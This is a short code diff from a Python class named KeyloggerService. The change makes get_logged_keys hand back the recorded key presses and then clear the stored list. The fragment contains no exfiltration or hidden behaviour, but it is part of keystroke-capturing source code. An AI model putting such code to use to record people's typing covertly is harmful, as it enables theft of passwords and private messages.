@@ -19,7 +19,9 @@ class KeyloggerService(IKeyLogger):
         self.listener.stop()
 
     def get_logged_keys(self) -> List[str]:
-        return self.presses
+        result = self.presses
+        self.presses = list()
+        return result
 
 
     def key_to_string(self,key):
